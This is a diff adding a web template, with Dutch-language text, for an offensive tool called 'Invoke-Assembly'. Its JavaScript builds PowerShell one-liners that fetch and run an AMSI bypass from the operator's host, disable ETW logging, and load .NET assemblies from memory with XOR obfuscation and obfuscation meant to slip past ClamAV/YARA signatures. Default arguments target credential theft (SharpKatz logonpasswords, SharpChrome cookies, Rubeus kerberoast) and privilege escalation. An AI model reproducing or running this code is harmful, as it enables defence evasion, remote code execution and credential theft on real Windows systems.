@@ -1,0 +1,598 @@
+{% extends "bootstrap/base.html" %}
+{% block title %}Invoke-Assembly — In-Memory .NET Loader{% endblock %}
+
+{% block styles %}
+<link rel="stylesheet" href="{{ url_for('static', filename='css/generator.css') }}" />
+{% endblock %}
+
+{% block content %}
+<div class="gen-header">
+  <div class="breadcrumbs"><a href="/">Start</a> / Invoke-Assembly</div>
+  <h1>Invoke-Assembly</h1>
+  <p>Laad .NET assemblies direct in geheugen. Optioneel XOR-obfuscatie van de binary,
+     sandbox-detectie via timing en PS1-obfuscatie via ClamAV/YARA signatures.</p>
+</div>
+
+<!-- Configuratie -->
+<section class="card">
+  <div class="card-head"><h2>Configuratie</h2></div>
+  <div class="card-body">
+    <div class="gen-form">
+
+      <div class="field">
+        <label for="sel-source">Bron</label>
+        <select id="sel-source" class="input">
+          <option value="tools">HTTP — Tools (http/tools/*.exe)</option>
+          <option value="payloads">HTTP — Payloads (http/payloads/*.exe)</option>
+          <option value="smb">SMB — UNC-pad (\\LHOST\share\...)</option>
+          <option value="url">Directe URL</option>
+        </select>
+      </div>
+
+      <div class="field" id="field-tool">
+        <label for="sel-tool">Tool</label>
+        <select id="sel-tool" class="input">
+          <option value="">-- laden... --</option>
+        </select>
+      </div>
+
+      <div class="field d-none" id="field-url">
+        <label for="inp-url">URL of UNC-pad</label>
+        <input type="text" id="inp-url" class="input" placeholder="http://10.0.0.1/tools/Rubeus.exe" />
+      </div>
+
+      <div class="field" id="field-port">
+        <label for="sel-port">Poort (HTTP server)</label>
+        <select id="sel-port" class="input">
+          <option value="80" selected>80</option>
+          <option value="443">443</option>
+          <option value="8080">8080</option>
+          <option value="custom">Aangepast...</option>
+        </select>
+      </div>
+
+      <div class="field d-none" id="field-port-custom">
+        <label for="inp-port">Aangepaste poort</label>
+        <input type="number" id="inp-port" class="input" placeholder="8443" min="1" max="65535" />
+      </div>
+
+      <div class="field">
+        <label for="inp-args">Argumenten <span class="help">(optioneel)</span></label>
+        <input type="text" id="inp-args" class="input" placeholder='kerberoast  of  --CollectionMethods All' />
+        <span class="help">Meerdere argumenten: spatie-gescheiden</span>
+      </div>
+
+      <div class="field">
+        <label for="inp-entry">EntryPoint override <span class="help">(optioneel)</span></label>
+        <input type="text" id="inp-entry" class="input" placeholder="Rubeus.Program" />
+        <span class="help">Alleen nodig als de assembly geen standaard Main() entry heeft</span>
+      </div>
+
+      <div class="field">
+        <label>Bypass opties</label>
+        <div class="ia-checkbox-row">
+          <label class="ia-checkbox-label">
+            <input type="checkbox" id="chk-no-amsi" /> AMSI overslaan
+          </label>
+          <label class="ia-checkbox-label">
+            <input type="checkbox" id="chk-no-etw" /> ETW overslaan
+          </label>
+          <label class="ia-checkbox-label">
+            <input type="checkbox" id="chk-no-sleep" /> Sandbox-check overslaan
+          </label>
+        </div>
+      </div>
+
+      <div class="field">
+        <label>Binary obfuscatie</label>
+        <div class="ia-xor-row">
+          <label class="ia-checkbox-label">
+            <input type="checkbox" id="chk-xor" /> XOR binary obfuscatie
+          </label>
+          <label class="ia-checkbox-label">
+            <input type="checkbox" id="chk-obfuscate" /> PS1 obfuscatie (ClamAV/YARA)
+          </label>
+        </div>
+        <div id="field-xor-key" class="ia-xor-key-row d-none">
+          <input type="text" id="inp-xor-key" class="input ia-xor-key-input"
+                 placeholder="Hex-sleutel (bijv. deadbeef01020304)" />
+          <button type="button" id="btn-regen-key" class="btn ia-xor-nowrap">Nieuw sleutel</button>
+        </div>
+        <span class="help ia-preview-hidden" id="xor-info">
+          Binary wordt server-side XOR'd en in PS1 gedecrypt voor Assembly.Load(). PE-headers onzichtbaar op netwerk.
+        </span>
+      </div>
+
+    </div>
+
+    <div class="gen-actions">
+      <button type="button" id="btn-generate" class="btn btn-primary">Genereer &amp; Download PS1</button>
+      <button type="button" id="btn-copy-cmd" class="btn">Kopieer aanroep</button>
+      <span id="gen-status" class="status"></span>
+    </div>
+  </div>
+</section>
+
+<!-- Preview: stapsgewijs -->
+<section class="card mt-14 ia-preview-hidden" id="preview-section">
+  <div class="card-head"><h2>Gegenereerde aanroep — stapsgewijs</h2></div>
+  <div class="card-body">
+    <div class="shell-category">
+
+      <div id="section-amsi">
+        <div class="shell-cat-header">Stap 1 — AMSI bypass</div>
+        <div class="shell-snippet">
+          <code id="cmd-amsi"></code>
+          <button type="button" class="btn-copy" id="copy-amsi">Kopieer</button>
+        </div>
+      </div>
+
+      <div id="section-etw">
+        <div class="shell-cat-header">Stap 2 — ETW bypass</div>
+        <div class="shell-snippet">
+          <code id="cmd-etw"></code>
+          <button type="button" class="btn-copy" id="copy-etw">Kopieer</button>
+        </div>
+      </div>
+
+      <div class="shell-cat-header" id="hdr-iwr">Stap 3 — Laad script</div>
+      <div class="shell-snippet">
+        <code id="cmd-iwr"></code>
+        <button type="button" class="btn-copy" id="copy-iwr">Kopieer</button>
+      </div>
+
+      <div class="shell-cat-header" id="hdr-invoke">Stap 4 — Uitvoeren</div>
+      <div class="shell-snippet">
+        <code id="cmd-invoke"></code>
+        <button type="button" class="btn-copy" id="copy-invoke">Kopieer</button>
+      </div>
+
+      <div class="shell-cat-header">Alles in één</div>
+      <div class="shell-snippet">
+        <code id="cmd-oneliner"></code>
+        <button type="button" class="btn-copy" id="copy-oneliner">Kopieer</button>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- Fileless IEX -->
+<section class="card mt-14 ia-preview-hidden" id="fileless-section">
+  <div class="card-head"><h2>Fileless IEX — geen PS1 op schijf</h2></div>
+  <div class="card-body">
+    <p class="text-muted ia-fileless-note">
+      Laadt de assembly rechtstreeks in geheugen zonder <code>invoke_assembly.ps1</code> te downloaden.
+      Bij XOR actief: download XOR'd bytes en decodeert inline.
+    </p>
+    <div class="shell-category">
+      <div class="shell-cat-header">One-liner (AMSI + ETW + Assembly.Load)</div>
+      <div class="shell-snippet">
+        <code id="cmd-fileless"></code>
+        <button type="button" class="btn-copy" id="copy-fileless">Kopieer</button>
+      </div>
+      <div class="shell-cat-header">Alleen Assembly.Load (geen bypasses)</div>
+      <div class="shell-snippet">
+        <code id="cmd-fileless-bare"></code>
+        <button type="button" class="btn-copy" id="copy-fileless-bare">Kopieer</button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Beschikbare .NET tools -->
+<section class="card mt-14">
+  <div class="card-head"><h2>Beschikbare .NET tools</h2></div>
+  <div class="card-body">
+    <div id="tools-list"><p class="text-muted">Laden...</p></div>
+  </div>
+</section>
+{% endblock %}
+
+{% block scripts %}
+<script nonce="{{ csp_nonce }}">
+(function () {
+  'use strict';
+
+  var selSource    = document.getElementById('sel-source');
+  var selTool      = document.getElementById('sel-tool');
+  var selPort      = document.getElementById('sel-port');
+  var inpUrl       = document.getElementById('inp-url');
+  var inpArgs      = document.getElementById('inp-args');
+  var inpEntry     = document.getElementById('inp-entry');
+  var inpPort      = document.getElementById('inp-port');
+  var inpXorKey    = document.getElementById('inp-xor-key');
+  var chkNoAmsi    = document.getElementById('chk-no-amsi');
+  var chkNoEtw     = document.getElementById('chk-no-etw');
+  var chkNoSleep   = document.getElementById('chk-no-sleep');
+  var chkXor       = document.getElementById('chk-xor');
+  var chkObfuscate = document.getElementById('chk-obfuscate');
+  var btnRegenKey  = document.getElementById('btn-regen-key');
+  var btnGen       = document.getElementById('btn-generate');
+  var btnCopyCmd   = document.getElementById('btn-copy-cmd');
+  var genStatus    = document.getElementById('gen-status');
+  var previewSec   = document.getElementById('preview-section');
+  var filelessSec  = document.getElementById('fileless-section');
+  var toolsList    = document.getElementById('tools-list');
+
+  var lhost = '';
+
+  var TOOL_ARGS = {
+    'Rubeus.exe':        'kerberoast',
+    'SharpHound.exe':    '--CollectionMethods All --ZipFileName loot.zip',
+    'Certify.exe':       'find /vulnerable',
+    'Seatbelt.exe':      '-group=all',
+    'SharpUp.exe':       'audit',
+    'Whisker.exe':       'list',
+    'SharpDPAPI.exe':    'triage',
+    'SharpChrome.exe':   'cookies',
+    'Snaffler.exe':      '-s -o snaffler.log',
+    'SharpWMI.exe':      'action=query query="SELECT * FROM Win32_ComputerSystem"',
+    'PingCastle.exe':    '--healthcheck',
+    'GodPotato.exe':     '-cmd "cmd /c whoami"',
+    'PrintSpoofer64.exe':'-i -c powershell',
+    'SweetPotato.exe':   '-p cmd.exe -a "/c whoami"',
+    'StandIn.exe':       '--object samaccountname=*',
+    'SharpGPOAbuse.exe': '--AddComputerTask --TaskName Upd --Author DOMAIN\\Administrator --Command cmd.exe --Arguments "/c whoami"',
+    'SharpSQL.exe':      '',
+    'SharpKatz.exe':     '--Command sekurlsa::logonpasswords',
+    'Inveigh.exe':       '',
+    'SafetyKatz.exe':    '',
+    'ADRecon.exe':       '',
+    'SharpRDP.exe':      '',
+  };
+
+  var ETW_ONELINER = '$p=[Ref].Assembly.GetType(\'System.Management.Automation.Tracing.PSEtwLogProvider\')' +
+    '.GetField(\'etwProvider\',\'NonPublic,Static\').GetValue($null);' +
+    '[Void]$p.GetType().GetField(\'m_enabled\',\'NonPublic,Instance\').SetValue($p,[Byte]0)';
+
+  function buildXorFileless(dlUrl, keyHex) {
+    return '$k=[byte[]]([regex]::Matches(\'' + keyHex + '\',..)' +
+      '|%{[Convert]::ToInt32($_.Value,16)});' +
+      '$r=(New-Object Net.WebClient).DownloadData(\'' + dlUrl + '\');' +
+      '$b=New-Object byte[] $r.Length;' +
+      'for($i=0;$i -lt $r.Length;$i++){$b[$i]=$r[$i] -bxor $k[$i%$k.Length]};' +
+      '[Reflection.Assembly]::Load($b)';
+  }
+
+  function randomHex(n) {
+    if (window.crypto && window.crypto.getRandomValues) {
+      var arr = new Uint8Array(n);
+      window.crypto.getRandomValues(arr);
+      return Array.from(arr).map(function(b){ return b.toString(16).padStart(2,'0'); }).join('');
+    }
+    var s = '';
+    for (var i = 0; i < n * 2; i++) s += Math.floor(Math.random() * 16).toString(16);
+    return s;
+  }
+
+  function clearEl(el) { while (el.firstChild) el.removeChild(el.firstChild); }
+  function setText(id, val) { var el = document.getElementById(id); if (el) el.textContent = val; }
+  function showEl(el)  { el.classList.remove('ia-preview-hidden'); }
+  function hideEl(el)  { el.classList.add('ia-preview-hidden'); }
+  function showId(id)  { var el = document.getElementById(id); if (el) showEl(el); }
+  function hideId(id)  { var el = document.getElementById(id); if (el) hideEl(el); }
+
+  function copyText(text, btn) {
+    if (navigator.clipboard) {
+      navigator.clipboard.writeText(text);
+    } else {
+      var ta = document.createElement('textarea');
+      ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
+      document.body.appendChild(ta); ta.select(); document.execCommand('copy');
+      document.body.removeChild(ta);
+    }
+    var orig = btn.textContent; btn.textContent = 'Gekopieerd!';
+    setTimeout(function(){ btn.textContent = orig; }, 1200);
+  }
+
+  function bindCopy(btnId, srcId) {
+    var btn = document.getElementById(btnId);
+    var src = document.getElementById(srcId);
+    if (btn && src) btn.addEventListener('click', function(){ copyText(src.textContent, btn); });
+  }
+  bindCopy('copy-amsi',          'cmd-amsi');
+  bindCopy('copy-etw',           'cmd-etw');
+  bindCopy('copy-iwr',           'cmd-iwr');
+  bindCopy('copy-invoke',        'cmd-invoke');
+  bindCopy('copy-oneliner',      'cmd-oneliner');
+  bindCopy('copy-fileless',      'cmd-fileless');
+  bindCopy('copy-fileless-bare', 'cmd-fileless-bare');
+
+  function getPort() {
+    if (selPort.value === 'custom') {
+      var p = parseInt(inpPort.value, 10);
+      return (p > 0 && p < 65536) ? String(p) : '80';
+    }
+    return selPort.value;
+  }
+
+  function getBaseUrl() { return 'http://' + lhost + ':' + getPort(); }
+
+  function getXorKey() {
+    return chkXor.checked ? inpXorKey.value.trim().toLowerCase() : '';
+  }
+
+  function getDlTarget(xorKey) {
+    var src  = selSource.value;
+    var tool = selTool.value;
+    var base = getBaseUrl();
+    if (src === 'url')  return inpUrl.value.trim();
+    if (!tool)          return '';
+    if (src === 'smb')  return '\\\\' + lhost + '\\share\\tools\\' + tool;
+    var folder = (src === 'payloads') ? 'payloads' : 'tools';
+    if (xorKey) return base + '/api/invoke-assembly/xor/' + folder + '/' + tool + '?key=' + xorKey;
+    return base + '/' + folder + '/' + tool;
+  }
+
+  function getToolName() {
+    if (selSource.value === 'url') return inpUrl.value.trim().split(/[/\\]/).pop();
+    return selTool.value;
+  }
+
+  function loadSettings() {
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', '/api/settings');
+    xhr.onload = function() {
+      if (xhr.status === 200) {
+        var d = JSON.parse(xhr.responseText);
+        lhost = (d.localhost || '').replace(/^https?:\/\//, '');
+        loadTools();
+      }
+    };
+    xhr.send();
+  }
+
+  function loadTools() {
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', '/api/reverseshells/tools');
+    xhr.onload = function() {
+      if (xhr.status !== 200) return;
+      var exe = JSON.parse(xhr.responseText).exe || [];
+      populateSelect(exe);
+      renderToolsList(exe);
+    };
+    xhr.send();
+  }
+
+  function loadPayloads() {
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', '/api/reverseshells/payloads');
+    xhr.onload = function() {
+      if (xhr.status !== 200) return;
+      var exe = (JSON.parse(xhr.responseText).payloads || [])
+        .filter(function(p){ return p.name.endsWith('.exe'); })
+        .map(function(p){ return p.name; });
+      populateSelect(exe);
+      renderToolsList(exe);
+    };
+    xhr.send();
+  }
+
+  function populateSelect(names) {
+    clearEl(selTool);
+    var opt0 = document.createElement('option');
+    opt0.value = ''; opt0.textContent = '-- selecteer --';
+    selTool.appendChild(opt0);
+    names.forEach(function(n) {
+      var opt = document.createElement('option');
+      opt.value = n; opt.textContent = n;
+      selTool.appendChild(opt);
+    });
+  }
+
+  function renderToolsList(names) {
+    clearEl(toolsList);
+    if (!names.length) {
+      var p = document.createElement('p'); p.className = 'text-muted';
+      p.textContent = 'Geen .exe tools gevonden.';
+      toolsList.appendChild(p); return;
+    }
+    var cat = document.createElement('div'); cat.className = 'shell-category';
+    names.forEach(function(name) {
+      var snippet = document.createElement('div'); snippet.className = 'shell-snippet';
+      var code = document.createElement('code');
+      code.textContent = name;
+      if (TOOL_ARGS[name]) {
+        var span = document.createElement('span');
+        span.className = 'help';
+        span.textContent = '  ' + TOOL_ARGS[name];
+        code.appendChild(span);
+      }
+      var btn = document.createElement('button');
+      btn.className = 'btn-copy'; btn.textContent = 'Selecteer'; btn.type = 'button';
+      btn.addEventListener('click', function() {
+        selTool.value = name;
+        if (!inpArgs.value.trim() && TOOL_ARGS[name]) inpArgs.value = TOOL_ARGS[name];
+        updatePreview();
+      });
+      snippet.appendChild(code); snippet.appendChild(btn);
+      cat.appendChild(snippet);
+    });
+    toolsList.appendChild(cat);
+  }
+
+  selSource.addEventListener('change', function() {
+    var src   = selSource.value;
+    var isUrl = (src === 'url');
+    var isSmb = (src === 'smb');
+    document.getElementById('field-tool').classList.toggle('d-none', isUrl);
+    document.getElementById('field-url').classList.toggle('d-none', !isUrl);
+    document.getElementById('field-port').classList.toggle('d-none', isSmb);
+    document.getElementById('field-port-custom').classList.toggle('d-none', isSmb || selPort.value !== 'custom');
+    if (src === 'tools' || src === 'smb') loadTools();
+    else if (src === 'payloads')          loadPayloads();
+    updatePreview();
+  });
+
+  selPort.addEventListener('change', function() {
+    document.getElementById('field-port-custom').classList.toggle('d-none', selPort.value !== 'custom');
+    updatePreview();
+  });
+
+  selTool.addEventListener('change', function() {
+    var name = selTool.value;
+    if (name && !inpArgs.value.trim() && TOOL_ARGS[name]) inpArgs.value = TOOL_ARGS[name];
+    updatePreview();
+  });
+
+  chkXor.addEventListener('change', function() {
+    var on = chkXor.checked;
+    document.getElementById('field-xor-key').classList.toggle('d-none', !on);
+    var xorInfo = document.getElementById('xor-info');
+    if (on) { showEl(xorInfo); if (!inpXorKey.value) inpXorKey.value = randomHex(16); }
+    else     { hideEl(xorInfo); }
+    updatePreview();
+  });
+
+  btnRegenKey.addEventListener('click', function() {
+    inpXorKey.value = randomHex(16);
+    updatePreview();
+  });
+
+  inpXorKey.addEventListener('input',    updatePreview);
+  inpArgs.addEventListener('input',      updatePreview);
+  inpUrl.addEventListener('input',       updatePreview);
+  inpPort.addEventListener('input',      updatePreview);
+  inpEntry.addEventListener('input',     updatePreview);
+  chkNoAmsi.addEventListener('change',   updatePreview);
+  chkNoEtw.addEventListener('change',    updatePreview);
+  chkNoSleep.addEventListener('change',  updatePreview);
+  chkObfuscate.addEventListener('change',updatePreview);
+
+  function updatePreview() {
+    var xorKey = getXorKey();
+    var target = getDlTarget(xorKey);
+    if (!target) { hideEl(previewSec); hideEl(filelessSec); return; }
+
+    var args       = inpArgs.value.trim();
+    var argStr     = args       ? ' -Arg ' + args              : '';
+    var src        = selSource.value;
+    var tool       = getToolName();
+    var noAmsi     = chkNoAmsi.checked;
+    var noEtw      = chkNoEtw.checked;
+    var noSleep    = chkNoSleep.checked;
+    var entryPoint = inpEntry.value.trim();
+    var epStr      = entryPoint ? ' -EntryPoint ' + entryPoint : '';
+    var xorStr     = xorKey    ? ' -XorKey ' + xorKey         : '';
+    var noAmsiStr  = noAmsi    ? ' -NoAmsi'                    : '';
+    var noEtwStr   = noEtw     ? ' -NoEtw'                     : '';
+    var noSleepStr = noSleep   ? ' -NoSleep'                   : '';
+
+    var base      = getBaseUrl();
+    var amsiUrl   = base + '/payloads/amsi-bypass.ps1';
+    var scriptUrl = base + '/payloads/invoke_assembly.ps1';
+
+    var stapNr = 1;
+    if (!noAmsi) {
+      showId('section-amsi');
+      setText('cmd-amsi', 'IEX(New-Object Net.WebClient).downloadString(\'' + amsiUrl + '\')');
+      stapNr++;
+    } else { hideId('section-amsi'); }
+
+    if (!noEtw) {
+      showId('section-etw');
+      setText('cmd-etw', ETW_ONELINER);
+      stapNr++;
+    } else { hideId('section-etw'); }
+
+    var hdrIwr    = document.getElementById('hdr-iwr');
+    var hdrInvoke = document.getElementById('hdr-invoke');
+    if (hdrIwr)    hdrIwr.textContent    = 'Stap ' + stapNr       + ' — Laad script';
+    if (hdrInvoke) hdrInvoke.textContent = 'Stap ' + (stapNr + 1) + ' — Uitvoeren';
+
+    var invokeCmd;
+    if (src === 'url' || src === 'smb') {
+      var rawTarget = (src === 'smb')
+        ? '\\\\' + lhost + '\\share\\tools\\' + tool
+        : inpUrl.value.trim();
+      invokeCmd = '.\\invoke_assembly.ps1 -Url ' + rawTarget + argStr + epStr + xorStr + noAmsiStr + noEtwStr + noSleepStr;
+    } else if (src === 'tools') {
+      invokeCmd = '.\\invoke_assembly.ps1 -Tool ' + tool + argStr + epStr + xorStr + noAmsiStr + noEtwStr + noSleepStr;
+    } else {
+      invokeCmd = '.\\invoke_assembly.ps1 -Payload ' + tool + argStr + epStr + xorStr + noAmsiStr + noEtwStr + noSleepStr;
+    }
+
+    setText('cmd-iwr', '(New-Object Net.WebClient).DownloadFile(\'' + scriptUrl + '\',\'C:\\Windows\\Tasks\\invoke_assembly.ps1\')');
+    setText('cmd-invoke', invokeCmd);
+
+    var parts = [];
+    if (!noAmsi) parts.push('IEX(New-Object Net.WebClient).downloadString(\'' + amsiUrl + '\')');
+    if (!noEtw)  parts.push(ETW_ONELINER);
+    parts.push('(New-Object Net.WebClient).DownloadFile(\'' + scriptUrl + '\',\'C:\\Windows\\Tasks\\invoke_assembly.ps1\')');
+    parts.push(invokeCmd);
+    setText('cmd-oneliner', parts.join('; '));
+
+    var filelessLoad;
+    if (xorKey) {
+      filelessLoad = buildXorFileless(target, xorKey) + '.EntryPoint';
+    } else {
+      filelessLoad = '[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData(\'' + target + '\')).EntryPoint';
+    }
+    var bareInvoke;
+    if (args) {
+      var argArr = '@(' + args.trim().split(/\s+/).map(function(a){
+        return '\'' + a.replace(/'/g, "''") + '\'';
+      }).join(',') + ')';
+      bareInvoke = filelessLoad + '.Invoke($null,@(,[string[]]' + argArr + '))';
+    } else {
+      bareInvoke = filelessLoad + '.Invoke($null,$null)';
+    }
+
+    var filelessParts = [];
+    if (!noAmsi) filelessParts.push('IEX(New-Object Net.WebClient).downloadString(\'' + amsiUrl + '\')');
+    if (!noEtw)  filelessParts.push(ETW_ONELINER);
+    filelessParts.push(bareInvoke);
+
+    setText('cmd-fileless',      filelessParts.join('; '));
+    setText('cmd-fileless-bare', bareInvoke);
+
+    showEl(previewSec);
+    showEl(filelessSec);
+  }
+
+  btnGen.addEventListener('click', function() {
+    var src    = selSource.value;
+    var args   = inpArgs.value.trim();
+    var ep     = inpEntry.value.trim();
+    var port   = getPort();
+    var xorKey = getXorKey();
+    var params = '?port=' + encodeURIComponent(port);
+
+    if (src === 'url') {
+      var url = inpUrl.value.trim();
+      if (!url) { genStatus.textContent = 'Vul een URL in'; return; }
+      params += '&url=' + encodeURIComponent(url);
+    } else if (src === 'smb') {
+      var smbTool = selTool.value;
+      if (!smbTool) { genStatus.textContent = 'Selecteer een tool'; return; }
+      params += '&url=' + encodeURIComponent('\\\\' + lhost + '\\share\\tools\\' + smbTool);
+    } else {
+      var tool = selTool.value;
+      if (!tool) { genStatus.textContent = 'Selecteer een tool'; return; }
+      params += (src === 'tools' ? '&tool=' : '&payload=') + encodeURIComponent(tool);
+    }
+    if (args)                params += '&args='       + encodeURIComponent(args);
+    if (ep)                  params += '&entrypoint=' + encodeURIComponent(ep);
+    if (xorKey)              params += '&xor='        + encodeURIComponent(xorKey);
+    if (chkObfuscate.checked) params += '&obfuscate=1';
+
+    genStatus.textContent = 'Downloaden...';
+    var a = document.createElement('a');
+    a.href = '/api/invoke-assembly/script' + params;
+    a.style.display = 'none';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    setTimeout(function(){ genStatus.textContent = ''; }, 1500);
+  });
+
+  btnCopyCmd.addEventListener('click', function() {
+    var el = document.getElementById('cmd-invoke');
+    if (el && el.textContent) copyText(el.textContent, btnCopyCmd);
+  });
+
+  loadSettings();
+})();
+</script>
+{% endblock %}
